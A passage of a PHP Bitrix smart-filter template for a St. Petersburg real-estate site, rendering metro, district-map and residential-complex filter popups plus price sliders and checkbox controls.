<? if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
/** @var array $arParams */
/** @var array $arResult */
/** @global CMain $APPLICATION */
/** @global CUser $USER */
/** @global CDatabase $DB */
/** @var CBitrixComponentTemplate $this */
/** @var string $templateName */
/** @var string $templateFile */
/** @var string $templateFolder */
/** @var string $componentPath */
/** @var CBitrixComponent $component */
$this->setFrameMode(true);

$templateData = array(
    'TEMPLATE_THEME' => $this->GetFolder() . '/themes/' . $arParams['TEMPLATE_THEME'] . '/colors.css',
    'TEMPLATE_CLASS' => 'bx_' . $arParams['TEMPLATE_THEME']
);
?>


<? // Filter Remote Control
$METRO_ID = 10;
$REGION_ID = 6;
$BUILDER_ID = 7;


foreach (array($METRO_ID, $REGION_ID) as $key => $val) {
    $property_enums = CIBlockPropertyEnum::GetList(Array("SORT" => "ASC", "VALUE" => "ASC"), Array("IBLOCK_ID" => 1, "PROPERTY_ID" => $val));
    while ($enum_fields = $property_enums->GetNext()) {
        $label_class = " disabled";
        if (array_key_exists($enum_fields["ID"], $arResult["ITEMS"][$val]["VALUES"])) $label_class = " active";
        $remote_control[$val][] = array("ENUM_ID" => abs(crc32($enum_fields["ID"])), "ENUM_VALUE" => $enum_fields["VALUE"], "ENUM_CLASS" => $label_class, "XML_ID" => $enum_fields["XML_ID"], "SORT" => $enum_fields["SORT"]);
    }
}

$objList = array();
$lett = null;
$countObjList = 0;
$arSelect = Array("ID", "NAME", "CODE");
$arFilter = Array("IBLOCK_ID" => 1, "ACTIVE" => "Y");
$res = CIBlockElement::GetList(Array("SORT" => "ASC", "NAME" => "ASC"), $arFilter, false, false, $arSelect);
while ($ob = $res->GetNextElement()) {
    $arFields = $ob->GetFields();
    $objList[] = $arFields;
    $countObjList++;
}

// Metro and Region not aveloble condition
?>
<script type="text/javascript">
    function showFullFilterNow(value){
        if (value.data('status') == 'close'){
            $('.bx_filter_parameters_box.BUILDER, .bx_filter_parameters_box.BUILDINGTYPE, .bx_filter_parameters_box.ENDINGPERIOD, .bx_filter_parameters_box.BANKS, .bx_filter_parameters_box.STOTAL, .bx_filter_parameters_box.EX_EXTRAS').css('display','block');
            value.data('status','open');
            value.html('Свернуть поиск');
            $('.smartFilterBottom').css('marginTop','0px');
            value.css('backgroundImage','url("/bitrix/templates/szvdom/images/icons/filter4.png") ');

        }else{
            $('.bx_filter_parameters_box.BUILDER,.bx_filter_parameters_box.BUILDINGTYPE, .bx_filter_parameters_box.ENDINGPERIOD, .bx_filter_parameters_box.BANKS, .bx_filter_parameters_box.STOTAL, .bx_filter_parameters_box.EX_EXTRAS').css('display','none');
            value.data('status','close');
            value.html('Расширенный поиск');
            $('.smartFilterBottom').css('marginTop','-45px');
            value.css('backgroundImage','url("/bitrix/templates/szvdom/images/icons/filter6.png") ');
        }
    }
</script>

<div class="remoteControlPopupBg"></div>

<? if ($arParams["IBLOCK_TYPE"] != "negotiation") { ?>
    <div class="remoteControlPopup">

        <div class="remoteControlMenu">
            <div class="remoteControlMenu_l inline_m">
                <div class="regionBtn inline">Районы</div>
                <div class="metroBtn inline">Метро</div>
                <div class="objListBtn inline">Список ЖК</div>
            </div>
            <div class="remoteControlMenu_r inline_m">
                <div class="remoteControlPopupClose top_close inline"></div>
            </div>
        </div>

        <div class="remoteControlMetro remoteControlBox">
            <div class="metroMap inline">
                <? foreach ($remote_control[$METRO_ID] as $item) :
                    /*            echo "<pre>";
                                var_dump($item);
                                echo "</pre>";*/
                    ?>
                    <label class="remote_control_lable<?= $item["ENUM_CLASS"] ?>"  data-fund="<?= ltrim($item["ENUM_CLASS"]) ?>"  data-xml="<?= $item["XML_ID"] ?>"  for="arrFilter_<?= $METRO_ID ?>_<?= $item["ENUM_ID"] ?>"><?= $item["ENUM_VALUE"] ?></label>
                <? endforeach; ?>
                <div class="remoteControlPopupNav">
                    <div class="rcElResultHolder inline">Найдено:
                        <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div> (ЖК)
                    </div>
                    <div></div>
                    <div class="uncheckall metro inline_m">Cнять выбранное</div>
                    <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
                </div>
            </div>
        </div>

        <div class="remoteControlRegion remoteControlBox">
            <div class="spb_map_holder inline">
                <img src="/bitrix/templates/szvdom/images/spb_districts.png" class="image_map" alt="" usemap="#region_main_map"/>
            </div>
            <map name="region_main_map">
                <area id="area_arrFilter_6_4163016541" class="region_map" shape="poly" coords="2,27,42,31,40,42,71,54,130,58,160,70,152,80,125,74,123,80,104,80,103,90,90,89,79,106,110,142,122,143,119,162,126,187,86,200,83,231,65,228,63,219,41,209,37,199,1,181" href="#" alt="Курортный">
                <area id="area_arrFilter_6_3864289797" class="region_map" shape="poly" coords="1,186,36,207,37,213,58,224,59,232,69,234,88,237,90,203,135,191,127,174,164,154,178,159,184,172,216,149,232,169,256,261,252,266,233,260,206,260,180,268,43,242,1,224" href="#" alt="Приморский">
                <area id="area_arrFilter_6_2136814527" class="region_map" shape="poly" coords="85,104,94,93,107,93,110,87,124,86,129,79,153,83,165,77,182,83,209,69,216,99,238,116,244,110,257,115,280,115,293,159,279,190,283,228,277,243,267,250,277,265,267,268,270,282,272,292,270,300,264,300,265,290,263,281,253,270,259,263,237,168,219,141,186,161,170,149,163,149,126,166,124,138,114,138,87,112" href="#" alt="Выборгский">
                <area id="area_arrFilter_6_255313712" class="region_map" shape="poly" coords="298,163,315,171,313,177,329,184,333,237,310,274,308,294,303,298,294,294,284,302,274,302,277,293,271,275,283,274,284,262,274,254,279,250,287,233,283,193" href="#" alt="Калининский">
                <area id="area_arrFilter_6_1904655245" class="region_map" shape="poly" coords="180,273,204,265,221,267,241,267,255,281,260,303,245,311,234,312,214,297,189,286,178,279" href="#" alt="Петроградский">
                <area id="area_arrFilter_6_3778651676" class="region_map" shape="poly" coords="337,189,348,196,351,210,366,213,367,231,378,250,380,260,393,263,401,271,382,276,375,327,342,322,323,348,313,352,306,337,315,278,338,238" href="#" alt="Красногвардейский">
                <area id="area_arrFilter_6_3390371295" class="region_map" shape="poly" coords="289,0,298,52,299,95,285,114,298,155,363,200,385,257,406,264,415,278,411,283,404,275,387,280,374,386,391,427,373,437,374,450,382,450,398,463,417,461,416,475,450,498,467,520,473,520,473,0" href="#" alt="Всеволожский">
                <area id="area_arrFilter_6_530233946" class="region_map" shape="poly" coords="162,294,189,290,215,305,229,316,238,315,240,321,217,331,210,348,173,343,159,330,149,314" href="#" alt="Василеостровский">
                <area id="area_arrFilter_6_140116777" class="region_map" shape="poly" coords="246,319,263,307,280,307,297,299,305,305,299,337,304,346,287,354,268,352,258,337,252,338,246,328" href="#" alt="Центральный">
                <area id="area_arrFilter_6_1755155148" class="region_map" shape="poly" coords="217,338,239,324,241,330,253,344,259,345,262,352,250,361,248,379,238,379,235,370,215,369,211,374,207,374,212,362,211,354,219,348" href="#" alt="Адмиралтейский">
                <area id="area_arrFilter_6_2016475046" class="region_map" shape="poly" coords="180,354,190,359,207,354,200,377,223,378,227,373,233,374,231,397,235,402,229,407,229,431,233,436,215,461,191,475,160,478,198,425,180,423,169,415,159,420,144,408,146,396,161,392,179,370,176,365" href="#" alt="Кировский">
                <area id="area_arrFilter_6_2438156947" class="region_map" shape="poly" coords="239,386,252,383,253,365,258,361,265,385,263,397,289,485,269,490,251,502,251,549,259,554,258,561,252,563,241,583,203,559,225,530,183,513,187,504,195,502,205,482,234,442,236,429,235,409,241,397,237,396" href="#" alt="Московский">
                <area id="area_arrFilter_6_109153051" class="region_map" shape="poly" coords="261,361,266,356,280,361,300,396,352,467,332,469,327,476,294,489,270,398,271,384" href="#" alt=" Фрунзенский">
                <area id="area_arrFilter_6_2520684170" class="region_map" shape="poly" coords="284,359,304,352,312,356,326,350,338,330,374,333,370,386,386,425,369,432,368,452,376,453,397,468,414,465,415,475,419,481,407,492,389,480,386,486,378,494,305,395" href="#" alt="Невский">
                <area id="area_arrFilter_6_372045425" class="region_map" shape="poly" coords="0,424,52,437,97,434,99,440,93,442,92,464,80,465,80,490,57,483,60,464,42,467,30,460,20,467,1,470" href="#" alt="Петродворцовый">
                <area id="area_arrFilter_6_1192990190" class="region_map" shape="poly" coords="103,427,123,425,139,414,153,425,165,422,188,429,152,483,185,482,205,473,193,493,181,499,180,508,169,507,168,514,163,521,137,513,139,525,130,545,133,553,125,562,110,562,112,616,65,617,81,587,78,576,85,570,72,561,88,549,90,540,100,540,99,519,118,502,104,488,84,490,83,468,97,468,96,445,106,443" href="#" alt="Красносельский">
                <area id="area_arrFilter_6_2741317649" class="region_map" shape="poly" coords="0,474,17,471,25,475,32,467,43,471,54,468,50,481,63,491,82,497,100,492,111,500,97,511,98,535,86,536,85,545,65,560,73,572,76,586,61,617,118,616,114,570,128,567,140,553,138,543,144,521,162,527,173,515,215,531,197,559,238,587,218,617,0,617" href="#" alt="Ломоносовский">
                <area id="area_arrFilter_6_2286445522" class="region_map" shape="poly" coords="255,509,287,492,294,493,327,481,332,477,340,486,338,493,343,515,386,536,375,567,387,574,387,585,410,585,408,598,424,614,424,616,226,617,238,592,246,589,253,567,260,567,266,553,257,545" href="#" alt="Пушкинский">
                <area id="area_arrFilter_6_2401609675" class="region_map" shape="poly" coords="340,475,353,472,376,498,391,488,405,496,421,486,442,498,460,522,472,527,473,610,465,600,454,600,454,607,425,606,416,598,415,578,393,582,393,574,382,563,392,533,359,518,348,509,344,495,348,490" href="#" alt="Колпинский">
            </map>
            <div class="spb_region_list inline">
                <div class="region_list_title">Санкт-петербург</div>
                <? $second_title = 0; ?>
                <? foreach ($remote_control[$REGION_ID] as $item) {
                    if ($item["SORT"] === "1") continue;
                    if ($item["SORT"] >= 500 && $second_title == 0) $second_title = 1;
                    $subway = "";
                    $arSelect = Array("ID","IBLOCK_ID", "NAME");
                    $arFilter = Array("IBLOCK_ID" => 7, "ACTIVE" => "Y","PROPERTY_REGION_XML_ID" => $item["XML_ID"]);
                    $res = CIBlockElement::GetList(Array("NAME" => "ASC"), $arFilter, false, false, $arSelect);
                    while ($ob = $res->GetNextElement()) {
                        $arFields = $ob->GetFields();
                        $prop = $ob->GetProperties();
                        foreach ($prop["SUBWAY_ID"]["VALUE_XML_ID"] as $key => $value){
                            if ($key != (count($prop["SUBWAY_ID"]["VALUE_XML_ID"]) - 1)){
                                $subway .= $value.",";
                            }else{
                                $subway .= $value;
                            }
                        }

                    }

                    if ($item["SORT"] >= 500 && $second_title == 1){ ?>
                        <div class="region_list_title">Ленинградская область</div>
                        <? $second_title = 2; }?>
                    <label class="remote_control_lable<?= $item["ENUM_CLASS"] ?>" data-xml="<?= $subway;?>" for="arrFilter_<?= $REGION_ID ?>_<?= $item["ENUM_ID"] ?>"><?= $item["ENUM_VALUE"] ?> район</label>
                <? } ?>

                <div class="remoteControlPopupNav">
                    <div class="rcElResultHolder inline">Найдено:
                        <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div> (ЖК)
                    </div>
                    <div></div>
                    <div class="uncheckall region inline_m">Cнять выбранное</div>
                    <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
                </div>

            </div>
        </div>

        <div class="remoteControlObjList remoteControlBox">
            <?
            function myCmp($a, $b) {
            if ($a['NAME'] === $b['NAME']) return 0;
            return $a['NAME'] < $b['NAME'] ? -1 : 1;
            }

                foreach ($objList as $kkkkey => $vals) {
                    $buffAr = explode(" ", $vals["NAME"]);
                    $buffName = "";
                    foreach ($buffAr as $iii => $vbuf) {
                        if (strtolower($vbuf) != "жк") {
                            $buffName .= $vbuf;
                            if ($iii != (count($buffAr) - 1)) {
                                $buffName .= " ";
                            }
                        }
                    }
                    $objList[$kkkkey]["NAME"] = $buffName;
                }
            uasort($objList, 'myCmp');
            $objListParts = array_chunk($objList, ceil(count($objList)) / 5); ?>
            <?


            foreach ($objListParts as $objListPart) : ?>
                <ul class="inline">
                    <? foreach ($objListPart as $item) : ?>
                        <?
                        $curr = mb_substr($item["NAME"], 0, 1);

                        if ($curr != $lett) {
                            ?>
                            <li><?= $curr ?></li><?
                            $lett = $curr;
                        }
                        ?>
                        <li><a href="/obekty/<?= $item["CODE"] ?>/"><?= $item["NAME"] ?></a></li>
                    <? endforeach; ?>
                </ul>
            <? endforeach; ?>
            <div class="remoteControlPopupNav">
                <div class="rcElResultHolder inline">Найдено:
                    <div class="rcElResult inline"><?= (isset($arResult["ELEMENT_COUNT"]) ? $arResult["ELEMENT_COUNT"] : $countObjList) ?></div> (ЖК)
                </div>
                <div></div>
                <div class="remoteControlPopupClose bottom_close inline_m" onclick="$('#set_filter').click();">Готово!</div>
            </div>
        </div>

    </div>
<? } ?>

<?
if ($arResult["FORM_ACTION"] == "/") {
    $arResult["FORM_ACTION"] = "/obekty/";
}

if (isset($_GET['set_filter'])) {
    $dnone=true;
} else {
    $dnone=false;
}
// Filter Remote Control End ?>
    <div class="filterHide" <?=($dnone == true)?'style="display:block;margin: 0;width: 100%;"':'style="display:none;"';?>>
        <div><span class="text">ИЗМЕНИТЬ ПАРАМЕТРЫ ПОИСКА</span><span class="icon cls"></span></div>
    </div>

<div class="bx_filter <?= $templateData["TEMPLATE_CLASS"] ?> <? if ($arParams["FILTER_VIEW_MODE"] == "horizontal"): ?>bx_horizontal<? endif ?>" <?=($dnone == true)?'style="display:none;"':'style="display:block;"';?>>
	<div class="bx_filter_section <?= ($arParams["IBLOCK_TYPE"] != "negotiation") ? "" : "pereustFilterMain"; ?>">
		<div class="bx_filter_title"><? echo GetMessage("CT_BCSF_FILTER_TITLE") ?></div>

		<form name="<? echo $arResult["FILTER_NAME"] . "_form" ?>" action="<?= $arResult["FORM_ACTION"]; ?>" method="get" class="smartfilter <?= ($arParams["IBLOCK_TYPE"] != "negotiation") ? "" : "pereustFilter"; ?>">
        <div class="filter_boxes first inline">
            <? if ($arParams["IBLOCK_TYPE"] != "negotiation") { ?>
    <div class="MRHolder inline">
        <div class="openRemoteControlPopup Metro">Выберите метро</div>
        <div class="openRemoteControlPopup Region">Выберите район</div>
        <div class="openRemoteControlPopup ObjList">Выберите объект</div>
    </div>
<? } ?>
<? foreach ($arResult["HIDDEN"] as $arItem): ?>
    <input type="hidden" name="<?echo $arItem["CONTROL_NAME"] ?>" id="<?echo $arItem["CONTROL_ID"] ?>" value="<?echo $arItem["HTML_VALUE"] ?>"/>
<?endforeach;
//prices

foreach ($arResult["ITEMS"] as $key => $arItem) {
   if ($arItem["CODE"] == "FLATCOST"){
        if (intval($arItem["VALUES"]["MIN"]["VALUE"]) == 0){
        	$arResult["ITEMS"][$key]["VALUES"]["MIN"]["VALUE"] = 800000;
        }	
    }

    $key = $arItem["ENCODED_ID"];
    if (isset($arItem["PRICE"])){



        if (!$arItem["VALUES"]["MIN"]["VALUE"] || !$arItem["VALUES"]["MAX"]["VALUE"] || $arItem["VALUES"]["MIN"]["VALUE"] == $arItem["VALUES"]["MAX"]["VALUE"])
            continue;
        ?>
        <div class="bx_filter_parameters_box active">
            <span class="bx_filter_container_modef"></span>

            <div class="bx_filter_parameters_box_title" onclick="smartFilter.hideFilterProps(this)"><?= $arItem["NAME"] ?></div>
            <div class="bx_filter_block">
                <div class="bx_filter_parameters_box_container">
                    <div class="bx_filter_parameters_box_container_block">
                        <div class="bx_filter_input_container">
                            <input
                                class="min-price"
                                type="text"
                                name="<?echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"]?>"
                                id="<?echo $arItem["VALUES"]["MIN"]["CONTROL_ID"]?>"
                                value="<?echo $arItem["VALUES"]["MIN"]["HTML_VALUE"]?>"
                                size="5"
                                onkeyup="smartFilter.keyup(this)"
                                />
                        </div>
                    </div>
                    <div class="bx_filter_parameters_box_container_block">
                        <div class="bx_filter_input_container">
                            <input
                                class="max-price"
                                type="text"
                                name="<?echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"]?>"
                                id="<?echo $arItem["VALUES"]["MAX"]["CONTROL_ID"]?>"
                                value="<?echo $arItem["VALUES"]["MAX"]["HTML_VALUE"]?>"
                                size="5"
                                onkeyup="smartFilter.keyup(this)"
                                />
                        </div>
                    </div>
                    <div style="clear: both;"></div>

                    <div class="bx_ui_slider_track" id="drag_track_<?= $key ?>">
                        <?
                        $price1 = $arItem["VALUES"]["MIN"]["VALUE"];
                        $price2 = $arItem["VALUES"]["MIN"]["VALUE"] + round(($arItem["VALUES"]["MAX"]["VALUE"] - $arItem["VALUES"]["MIN"]["VALUE"]) / 4);
                        $price3 = $arItem["VALUES"]["MIN"]["VALUE"] + round(($arItem["VALUES"]["MAX"]["VALUE"] - $arItem["VALUES"]["MIN"]["VALUE"]) / 2);
                        $price4 = $arItem["VALUES"]["MIN"]["VALUE"] + round((($arItem["VALUES"]["MAX"]["VALUE"] - $arItem["VALUES"]["MIN"]["VALUE"]) * 3) / 4);
                        $price5 = $arItem["VALUES"]["MAX"]["VALUE"];
                        ?>
                        <div class="bx_ui_slider_part p1"><span><?= $price1 ?></span></div>
                        <div class="bx_ui_slider_part p2"><span><?= $price2 ?></span></div>
                        <div class="bx_ui_slider_part p3"><span><?= $price3 ?></span></div>
                        <div class="bx_ui_slider_part p4"><span><?= $price4 ?></span></div>
                        <div class="bx_ui_slider_part p5"><span><?= $price5 ?></span></div>

                        <div class="bx_ui_slider_pricebar_VD" style="left: 0;right: 0;" id="colorUnavailableActive_<?= $key ?>"></div>
                        <div class="bx_ui_slider_pricebar_VN" style="left: 0;right: 0;" id="colorAvailableInactive_<?= $key ?>"></div>
                        <div class="bx_ui_slider_pricebar_V" style="left: 0;right: 0;" id="colorAvailableActive_<?= $key ?>"></div>
                        <div class="bx_ui_slider_range" id="drag_tracker_<?= $key ?>" style="left: 0%; right: 0%;">
                            <a class="bx_ui_slider_handle left" style="left:0;" href="javascript:void(0)" id="left_slider_<?= $key ?>"></a>
                            <a class="bx_ui_slider_handle right" style="right:0;" href="javascript:void(0)" id="right_slider_<?= $key ?>"></a>
                        </div>
                    </div>
                    <div style="opacity: 0;height: 1px;"></div>
                </div>
            </div>
        </div>
    <?
    $presicion = 2;
    if (Bitrix\Main\Loader::includeModule("currency")) {
        $res = CCurrencyLang::GetFormatDescription($arItem["VALUES"]["MIN"]["CURRENCY"]);
        $presicion = $res['DECIMALS'];
    }
    $arJsParams = array(
        "leftSlider" => 'left_slider_' . $key,
        "rightSlider" => 'right_slider_' . $key,
        "tracker" => "drag_tracker_" . $key,
        "trackerWrap" => "drag_track_" . $key,
        "minInputId" => $arItem["VALUES"]["MIN"]["CONTROL_ID"],
        "maxInputId" => $arItem["VALUES"]["MAX"]["CONTROL_ID"],
        "minPrice" => $arItem["VALUES"]["MIN"]["VALUE"],
        "maxPrice" => $arItem["VALUES"]["MAX"]["VALUE"],
        "curMinPrice" => $arItem["VALUES"]["MIN"]["HTML_VALUE"],
        "curMaxPrice" => $arItem["VALUES"]["MAX"]["HTML_VALUE"],
        "fltMinPrice" => intval($arItem["VALUES"]["MIN"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MIN"]["FILTERED_VALUE"] : $arItem["VALUES"]["MIN"]["VALUE"],
        "fltMaxPrice" => intval($arItem["VALUES"]["MAX"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MAX"]["FILTERED_VALUE"] : $arItem["VALUES"]["MAX"]["VALUE"],
        "precision" => $presicion,
        "colorUnavailableActive" => 'colorUnavailableActive_' . $key,
        "colorAvailableActive" => 'colorAvailableActive_' . $key,
        "colorAvailableInactive" => 'colorAvailableInactive_' . $key,
    );
    ?>
        <script type="text/javascript">
            BX.ready(function () {
                window['trackBar<?=$key?>'] = new BX.Iblock.SmartFilter(<?=CUtil::PhpToJSObject($arJsParams)?>);
            });
        </script>
    <?}
}

//not prices
foreach ($arResult["ITEMS"] as $key => $arItem) {
    if (
        empty($arItem["VALUES"])
        || isset($arItem["PRICE"])
    )
        continue;


    if (
        $arItem["DISPLAY_TYPE"] == "A"
        && (
            !$arItem["VALUES"]["MIN"]["VALUE"]
            || !$arItem["VALUES"]["MAX"]["VALUE"]
            || $arItem["VALUES"]["MIN"]["VALUE"] == $arItem["VALUES"]["MAX"]["VALUE"]
        )
    )
        continue;

        
    ?>
    <? if ($arItem["CODE"] == "ROOM_NUM"): ?></div><div class="filter_boxes second inline"><?endif;?>
    <? if ($arItem["CODE"] == "FLATCOST"): ?></div><div class="filter_boxes third inline"><?endif;?>
    <div class="bx_filter_parameters_box <?= $arItem["CODE"] ?>">
        <span class="bx_filter_container_modef"></span>

        <div class="bx_filter_parameters_box_title"><?= $arItem["NAME"] ?></div>
        <div class="bx_filter_block">
            <div class="bx_filter_parameters_box_container">
                <?
                $arCur = current($arItem["VALUES"]);
                switch ($arItem["DISPLAY_TYPE"]) {
                case "A"://NUMBERS_WITH_SLIDER

                    ?>
                    <div class="bx_filter_parameters_box_container_block">
                        <input
                            class="min-price"
                            type="hidden"
                            name="<?echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"]?>"
                            id="<?echo $arItem["VALUES"]["MIN"]["CONTROL_ID"]?>"
                            value="<?echo $arItem["VALUES"]["MIN"]["HTML_VALUE"]?>"
                            size="5"
                            onkeyup="smartFilter.keyup(this)"
                            />
                        <input
                            class="max-price"
                            type="hidden"
                            name="<?echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"]?>"
                            id="<?echo $arItem["VALUES"]["MAX"]["CONTROL_ID"]?>"
                            value="<?echo $arItem["VALUES"]["MAX"]["HTML_VALUE"]?>"
                            size="5"
                            onkeyup="smartFilter.keyup(this);"
                            />

                        <div class="bx_ui_slider_track" id="drag_track_<?= $key ?>">
                            <div class="bx_ui_slider_pricebar_VD" style="left: 0;right: 0;" id="colorUnavailableActive_<?= $key ?>"></div>
                            <div class="bx_ui_slider_pricebar_VN" style="left: 0;right: 0;" id="colorAvailableInactive_<?= $key ?>"></div>
                            <div class="bx_ui_slider_pricebar_V" style="left: 0;right: 0;" id="colorAvailableActive_<?= $key ?>"></div>
                            <div class="bx_ui_slider_range" id="drag_tracker_<?= $key ?>" style="left: 0;right: 0;">
                                <a class="bx_ui_slider_handle left" style="left:0;" href="javascript:void(0)" id="left_slider_<?= $key ?>"></a>
                                <a class="bx_ui_slider_handle right" style="right:0;" href="javascript:void(0)" id="right_slider_<?= $key ?>"></a>
                            </div>
                        </div>
                        <?
                        if (!empty($arItem["VALUES"]["MIN"]["HTML_VALUE"])){
                            $value1 = $arItem["VALUES"]["MIN"]["HTML_VALUE"];
                        }else{
                            $value1 = $arItem["VALUES"]["MIN"]["VALUE"];
                        }
                        if (!empty($arItem["VALUES"]["MAX"]["HTML_VALUE"])){
                            $value2 = $arItem["VALUES"]["MAX"]["HTML_VALUE"];
                        }else{
                            $value2 = $arItem["VALUES"]["MAX"]["VALUE"];
                        }

                        if ($arItem["CODE"] == "FLATCOST"){
                            $resVal1 = round(($value1 / 1000000), 1);
                            $resVal2 = round(($value2 / 1000000), 1);
                        }else{
                            $resVal1 = $value1;
                            $resVal2 = $value2;
                        }
                        ?>
                        <div class="show_res_holder">
                            <div class="inline min" id="show_<?echo $arItem["VALUES"]["MIN"]["CONTROL_ID"]?>" class="">
                                <?//=($value1>1000000?round(($value1/1000000),1):$value1);
                                ?>
                                <?= $resVal1 ?>
                            </div>
                            <div class="inline max" id="show_<?echo $arItem["VALUES"]["MAX"]["CONTROL_ID"]?>" class="">
                                <?//=($value2>1000000?round(($value2/1000000),1):$value2);
                                ?>
                                <?= $resVal2 ?>
                            </div>
                        </div>
                    </div>
                <?
                $arJsParams = array(
                    "leftSlider" => 'left_slider_' . $key,
                    "rightSlider" => 'right_slider_' . $key,
                    "tracker" => "drag_tracker_" . $key,
                    "trackerWrap" => "drag_track_" . $key,
                    "minInputId" => $arItem["VALUES"]["MIN"]["CONTROL_ID"],
                    "maxInputId" => $arItem["VALUES"]["MAX"]["CONTROL_ID"],
                    "minPrice" => $arItem["VALUES"]["MIN"]["VALUE"],
                    "maxPrice" => $arItem["VALUES"]["MAX"]["VALUE"],
                    "curMinPrice" => $arItem["VALUES"]["MIN"]["HTML_VALUE"],
                    "curMaxPrice" => $arItem["VALUES"]["MAX"]["HTML_VALUE"],
                    "fltMinPrice" => intval($arItem["VALUES"]["MIN"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MIN"]["FILTERED_VALUE"] : $arItem["VALUES"]["MIN"]["VALUE"],
                    "fltMaxPrice" => intval($arItem["VALUES"]["MAX"]["FILTERED_VALUE"]) ? $arItem["VALUES"]["MAX"]["FILTERED_VALUE"] : $arItem["VALUES"]["MAX"]["VALUE"],
                    "precision" => 0,
                    "colorUnavailableActive" => 'colorUnavailableActive_' . $key,
                    "colorAvailableActive" => 'colorAvailableActive_' . $key,
                    "colorAvailableInactive" => 'colorAvailableInactive_' . $key,
                );
                ?>
                    <script type="text/javascript">
                        BX.ready(function () {
                            window['trackBar<?=$key?>'] = new BX.Iblock.SmartFilter(<?=CUtil::PhpToJSObject($arJsParams)?>);
                        });
                    </script>
                <?
                break;
                case "B"://NUMBERS
                ?>
                    <div class="bx_filter_parameters_box_container_block">
                        <div class="bx_filter_input_container">
                            <input
                                class="min-price"
                                type="text"
                                name="<?echo $arItem["VALUES"]["MIN"]["CONTROL_NAME"]?>"
                                id="<?echo $arItem["VALUES"]["MIN"]["CONTROL_ID"]?>"
                                value="<?echo $arItem["VALUES"]["MIN"]["HTML_VALUE"]?>"
                                size="5"
                                onkeyup="smartFilter.keyup(this)"
                                />
                        </div>
                    </div>
                    <div class="bx_filter_parameters_box_container_block">
                        <div class="bx_filter_input_container">
                            <input
                                class="max-price"
                                type="text"
                                name="<?echo $arItem["VALUES"]["MAX"]["CONTROL_NAME"]?>"
                                id="<?echo $arItem["VALUES"]["MAX"]["CONTROL_ID"]?>"
                                value="<?echo $arItem["VALUES"]["MAX"]["HTML_VALUE"]?>"
                                size="5"
                                onkeyup="smartFilter.keyup(this)"
                                />
                        </div>
                    </div>
                <?
                break;
                case "G"://CHECKBOXES_WITH_PICTURES
                ?>
                <?foreach ($arItem["VALUES"] as $val => $ar):?>
                <input
                    style="display: none"
                    type="checkbox"
                    name="<?= $ar["CONTROL_NAME"] ?>"
                    id="<?= $ar["CONTROL_ID"] ?>"
                    value="<?= $ar["HTML_VALUE"] ?>"
                    <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                    />
                    <?
                    $class = "";
                    if ($ar["CHECKED"])
                        $class .= " active";
                    if ($ar["DISABLED"])
                        $class .= " disabled";
                    ?>
                    <label for="<?= $ar["CONTROL_ID"] ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label dib<?= $class ?>" onclick="smartFilter.keyup(BX('<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')); BX.toggleClass(this, 'active');">
										<span class="bx_filter_param_btn bx_color_sl">
											<?if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])):?>
                                                <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                            <?endif?>
										</span>
                    </label>
                <?endforeach?>
                <?
                break;
                case "H"://CHECKBOXES_WITH_PICTURES_AND_LABELS
                ?>
                <?foreach ($arItem["VALUES"] as $val => $ar):?>
                <input
                    style="display: none"
                    type="checkbox"
                    name="<?= $ar["CONTROL_NAME"] ?>"
                    id="<?= $ar["CONTROL_ID"] ?>"
                    value="<?= $ar["HTML_VALUE"] ?>"
                    <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                    />
                    <?
                    $class = "";
                    if ($ar["CHECKED"])
                        $class .= " active";
                    if ($ar["DISABLED"])
                        $class .= " disabled";
                    ?>
                    <label for="<?= $ar["CONTROL_ID"] ?>" data-role="label_<?= $ar["CONTROL_ID"] ?>" class="bx_filter_param_label<?= $class ?>" onclick="smartFilter.keyup(BX('<?= CUtil::JSEscape($ar["CONTROL_ID"]) ?>')); BX.toggleClass(this, 'active');">
										<span class="bx_filter_param_btn bx_color_sl">
											<?if (isset($ar["FILE"]) && !empty($ar["FILE"]["SRC"])):?>
                                                <span class="bx_filter_btn_color_icon" style="background-image:url('<?= $ar["FILE"]["SRC"] ?>');"></span>
                                            <?endif?>
										</span>
										<span class="bx_filter_param_text">
											<?= $ar["VALUE"] ?>
										</span>
                    </label>
                <?endforeach?>
                <?
                break;
                case "P"://DROPDOWN
                $checkedItemExist = false;
                echo "GOTCHA";
                ?>
                    <div class="bx_filter_select_container">
                        <div class="bx_filter_select_block" onclick="smartFilter.showDropDownPopup(this, '<?= CUtil::JSEscape($key) ?>')">
                            <div class="bx_filter_select_text" data-role="currentOption">
                                <?
                                foreach ($arItem["VALUES"] as $val => $ar) {
                                    if ($ar["CHECKED"]) {
                                        echo $ar["VALUE"];
                                        $checkedItemExist = true;
                                    }
                                }
                                if (!$checkedItemExist) {
                                    echo GetMessage("CT_BCSF_FILTER_ALL");
                                }
                                ?>
                            </div>
                            <div class="bx_filter_select_arrow"></div>
                            <input
                                style="display: none"
                                type="radio"
                                name="<?= $arCur["CONTROL_NAME_ALT"] ?>"
                                id="<? echo "all_" . $arCur["CONTROL_ID"] ?>"
                                value=""
                                />
                            <?foreach ($arItem["VALUES"] as $val => $ar):?>
                                <input
                                    style="display: none"
                                    type="radio"
                                    name="<?= $ar["CONTROL_NAME_ALT"] ?>"
                                    id="<?= $ar["CONTROL_ID"] ?>"
                                    value="<? echo $ar["HTML_VALUE_ALT"] ?>"
                                    <? echo $ar["CHECKED"] ? 'checked="checked"' : '' ?>
                                    />
                            <?endforeach?>
